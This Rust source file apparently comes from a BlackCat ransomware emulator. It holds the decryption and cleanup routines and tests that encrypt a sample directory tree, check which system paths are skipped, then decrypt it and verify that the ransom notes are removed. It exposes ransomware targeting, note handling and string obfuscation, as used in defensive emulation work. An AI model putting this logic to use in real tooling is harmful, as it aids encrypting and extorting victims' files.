cfg_if! {
    if #[cfg(target_os = "windows")] {
        use std::error::Error;
        use crate::enumerate::{enumerate_and_process, ENUMERATE_AND_DECRYPT};
        pub use crate::config::Host;
    } else {
        use crate::kvm::{decrypt_volumes, get_volume_paths};
        use crate::logger::{log_info, log_error};
        use encryptliterals::esl;
    }
}

#[cfg(target_os = "windows")]
pub fn enumerate_and_decrypt(pool: &rayon::ThreadPool, host: &Host, crawl_start: String) -> Result<Vec<String>, Box<dyn Error>> {
    enumerate_and_process(&pool, host, crawl_start, ENUMERATE_AND_DECRYPT)
}

#[cfg(unix)]
pub fn enumerate_and_decrypt_volumes(pool: &rayon::ThreadPool, key: &[u8; 16], extension: &str, note_file_name: &str) {
    log_info(String::from(esl!("Enumerating volume paths from default pool for cleanup.")));
    let kvm_volume_paths = match get_volume_paths() {
        Ok(o) => {
            log_info(format!("{}:\n{}", esl!("Discovered the following default pool volume paths"), o.join("\n")));
            o
        },
        Err(e) => {
            log_error(format!("{}: {}", esl!("Failed to get volume paths for default pool"), e));
            return;
        }
    };
    decrypt_volumes(&pool, &kvm_volume_paths, key, extension, note_file_name);
    log_info(String::from(esl!("Finished decrypting volumes.")));
}

#[cfg(target_os = "windows")]
#[cfg(test)]
mod tests {
    use super::*;
    use std::fs::{File, create_dir, read, remove_dir_all};
    use std::path::Path;
    use std::fs::{read_to_string, write};
    use serial_test::serial;
    pub use crate::config::validate_access_token;
    use crate::encrypt;
    use crate::enumerate::enumerate_and_encrypt;

    // Test clean up with single small file
    #[test]
    #[serial]
    fn test_cleanup_small() {
        let config = validate_access_token("15742aa362a84ba3").unwrap();
        let mut h = Host::new(config);
        h.set_aes_key([0x42;16]);

        let dir = ".\\blackcattest";

        h.set_strict_include_paths(&mut vec![dir.to_string().to_lowercase()]);

        let file_path_string = ".\\blackcattest\\filetest.txt".to_owned() + h.get_extension();
        let file_path = Path::new(&file_path_string);

        if Path::new(dir).exists() {
            remove_dir_all(dir).unwrap();
        }
        create_dir(dir).unwrap();
        File::create(file_path).unwrap();
        write(file_path, "hello world! this is my plaintext.").unwrap();

        let ransom_path_string = ".\\blackcattest\\".to_owned() + h.get_note_file_name();
        let ransom_path = Path::new(&ransom_path_string);
        File::create(ransom_path).unwrap();

        let pool = rayon::ThreadPoolBuilder::new().num_threads(5).build().unwrap();
        let result = enumerate_and_decrypt(&pool, &h, ".".to_string()).unwrap();
        assert_eq!(result, vec![String::from(".\\blackcattest\\filetest.txt")]);
        assert!(!ransom_path.exists());

        let decrypted_file = Path::new(".\\blackcattest\\filetest.txt");
        assert!(decrypted_file.exists());
        let contents = read_to_string(decrypted_file).unwrap();
        assert_eq!(contents, "hello world! this is my plaintext.");

        remove_dir_all(dir).unwrap();
    }

    // Test cleanup with single large file
    #[test]
    #[serial]
    fn test_cleanup_large() {
        let config = validate_access_token("15742aa362a84ba3").unwrap();
        let mut h = Host::new(config);
        h.set_aes_key([0x42;16]);

        let dir = ".\\blackcattest";

        h.set_strict_include_paths(&mut vec![dir.to_string().to_lowercase()]);

        let file_path_string = ".\\blackcattest\\filetest.txt".to_owned() + h.get_extension();
        let file_path = Path::new(&file_path_string);

        if Path::new(dir).exists() {
            remove_dir_all(dir).unwrap();
        }
        create_dir(dir).unwrap();
        File::create(file_path).unwrap();
        write(file_path, "Call me Ishmael. Some years ago- never mind how long precisely- having little or no money in my purse, and nothing particular to interest me on shore, I thought I would sail about a little and see the watery part of the world. It is a way I have of driving off the spleen and regulating the circulation. Whenever I find myself growing grim about the mouth; whenever it is a damp, drizzly November in my soul; whenever I find myself involuntarily pausing before coffin warehouses, and bringing up the rear of every funeral I meet; and especially whenever my hypos get such an upper hand of me, that it requires a strong moral principle to prevent me from deliberately stepping into the street, and methodically knocking people's hats off- then, I account it high time to get to sea as soon as I can. This is my substitute for pistol and ball. With a philosophical flourish Cato throws himself upon his sword; I quietly take to the ship. There is nothing surprising in this. If they but knew it, almost all men in their degree, some time or other, cherish very nearly the same feelings towards the ocean with me.")
            .unwrap();

        let ransom_path_string = ".\\blackcattest\\".to_owned() + h.get_note_file_name();
        let ransom_path = Path::new(&ransom_path_string);
        File::create(ransom_path).unwrap();

        let pool = rayon::ThreadPoolBuilder::new().num_threads(5).build().unwrap();
        let result = enumerate_and_decrypt(&pool, &h, ".".to_string()).unwrap();
        assert!(!ransom_path.exists());
        assert_eq!(result, vec![String::from(".\\blackcattest\\filetest.txt")]);

        let decrypted_file = Path::new(".\\blackcattest\\filetest.txt");
        assert!(decrypted_file.exists());
        let contents = read_to_string(decrypted_file).unwrap();
        assert_eq!(contents, "Call me Ishmael. Some years ago- never mind how long precisely- having little or no money in my purse, and nothing particular to interest me on shore, I thought I would sail about a little and see the watery part of the world. It is a way I have of driving off the spleen and regulating the circulation. Whenever I find myself growing grim about the mouth; whenever it is a damp, drizzly November in my soul; whenever I find myself involuntarily pausing before coffin warehouses, and bringing up the rear of every funeral I meet; and especially whenever my hypos get such an upper hand of me, that it requires a strong moral principle to prevent me from deliberately stepping into the street, and methodically knocking people's hats off- then, I account it high time to get to sea as soon as I can. This is my substitute for pistol and ball. With a philosophical flourish Cato throws himself upon his sword; I quietly take to the ship. There is nothing surprising in this. If they but knew it, almost all men in their degree, some time or other, cherish very nearly the same feelings towards the ocean with me.");

        remove_dir_all(dir).unwrap();
    }

    #[test]
    #[serial]
    fn test_cleanup_comprehensive() {
        /*
         * Test file structure:
         *      ./blackcattestenumenc
         *          file.txt
         *          file2.txt
         *          ntuser.dat // SKIP
         *          log.xtlog // SKIP
         *          dir1/ // SKIP
         *              file.ico //SKIP
         *              ntuser.ini // SKIP
         *          dir2/
         *              file.doc
         *              gooddir/
         *                  file.txt
         *                  dira/
         *                      file.pdf
         *                      file.log
         *                      dirb/
         *                          file.jpg
         *              application data/ // SKIP
         *                  file.txt
         *          dir3/ // SKIP
         *          files/
         *              mozilla/ // SKIP
         *              file.pptx
         *              file.bat // SKIP
         *              thumbs.db // SKIP
         *          System Volume Information // SKIP
         *              dir1/
         *                  file.pdf
         *                  file.log
         *              dir2/
         *          Intel/ //SKIP
         *              file.txt
         *          Program Files/ // SKIP
         *              file.txt
         */
        
         // Set up test environment
         let start_dir = ".\\blackcattestenumenc";

        let directories = vec![
            ".\\blackcattestenumenc", 
            ".\\blackcattestenumenc\\dir1",
            ".\\blackcattestenumenc\\dir2",
            ".\\blackcattestenumenc\\dir2\\gooddir",
            ".\\blackcattestenumenc\\dir2\\gooddir\\dira",
            ".\\blackcattestenumenc\\dir2\\gooddir\\dira\\dirb",
            ".\\blackcattestenumenc\\dir2\\application data",
            ".\\blackcattestenumenc\\dir3",
            ".\\blackcattestenumenc\\files",
            ".\\blackcattestenumenc\\files\\mozilla",
            ".\\blackcattestenumenc\\System Volume Information",
            ".\\blackcattestenumenc\\System Volume Information\\dir1",
            ".\\blackcattestenumenc\\System Volume Information\\dir2",
            ".\\blackcattestenumenc\\Intel",
            ".\\blackcattestenumenc\\Program Files",
        ];

        let files = vec![
            ".\\blackcattestenumenc\\ntuser.dat", // SKIP
            ".\\blackcattestenumenc\\log.xtlog", // SKIP
            ".\\blackcattestenumenc\\file.txt",
            ".\\blackcattestenumenc\\file2.txt",
            ".\\blackcattestenumenc\\dir1\\file.ico", // SKIP
            ".\\blackcattestenumenc\\dir1\\ntuser.ini", // SKIP
            ".\\blackcattestenumenc\\dir2\\file.doc",
            ".\\blackcattestenumenc\\dir2\\gooddir\\file.txt",
            ".\\blackcattestenumenc\\dir2\\gooddir\\dira\\file.pdf",
            ".\\blackcattestenumenc\\dir2\\gooddir\\dira\\file.log",
            ".\\blackcattestenumenc\\dir2\\gooddir\\dira\\dirb\\file.jpg",
            ".\\blackcattestenumenc\\dir2\\application data\\file.txt", // SKIP
            ".\\blackcattestenumenc\\files\\file.pptx",
            ".\\blackcattestenumenc\\files\\file.bat", // SKIP
            ".\\blackcattestenumenc\\files\\thumbs.db", // SKIP
            ".\\blackcattestenumenc\\System Volume Information\\dir1\\file.pdf", // SKIP
            ".\\blackcattestenumenc\\System Volume Information\\dir1\\file.log", // SKIP
            ".\\blackcattestenumenc\\Intel\\file.txt", // SKIP
            ".\\blackcattestenumenc\\Program Files\\file.txt", // SKIP
        ];

        let mut affected_files = vec![
            ".\\blackcattestenumenc\\file.txt",
            ".\\blackcattestenumenc\\file2.txt",
            ".\\blackcattestenumenc\\dir2\\file.doc",
            ".\\blackcattestenumenc\\dir2\\gooddir\\file.txt",
            ".\\blackcattestenumenc\\dir2\\gooddir\\dira\\file.pdf",
            ".\\blackcattestenumenc\\dir2\\gooddir\\dira\\file.log",
            ".\\blackcattestenumenc\\dir2\\gooddir\\dira\\dirb\\file.jpg",
            ".\\blackcattestenumenc\\files\\file.pptx",
        ];

        if Path::new(start_dir).exists() {
            remove_dir_all(start_dir).unwrap();
        }

        for dir in &directories {
            create_dir(dir).unwrap();
        }
        
        let plaintext = [1u8; 1600];
        for path in &files {
            File::create(path).unwrap();
            write(path, plaintext).unwrap();
        }

        // run the enumeration and encryption, then clean up
        let config = validate_access_token("15742aa362a84ba3").unwrap();
        let mut h = Host::new(config);
        encrypt::set_aes_key(&mut h);

        let pool = rayon::ThreadPoolBuilder::new().num_threads(5).build().unwrap();
        let mut encrypted_files = enumerate_and_encrypt(&pool, &h, start_dir.to_owned()).unwrap();
        let mut decrypted_files = enumerate_and_decrypt(&pool, &h, start_dir.to_owned()).unwrap();
        encrypted_files.sort();
        affected_files.sort();
        decrypted_files.sort();

        assert_eq!(encrypted_files, decrypted_files);
        assert_eq!(affected_files, decrypted_files);

        // Verify all files have original plaintext and no extension
        for file in files {
            let ext_path = format!("{}{}", file, h.get_extension());
            assert!(!Path::new(&ext_path).exists());
            let contents = read(&file).unwrap();
            assert_eq!(contents.as_slice(), plaintext);
        }

        // Verify no ransom note in directories
        for dir in directories {
            assert!(!Path::new(dir).join(h.get_note_file_name()).exists());
        }

        // Cleanup
        remove_dir_all(start_dir).unwrap();
    }
}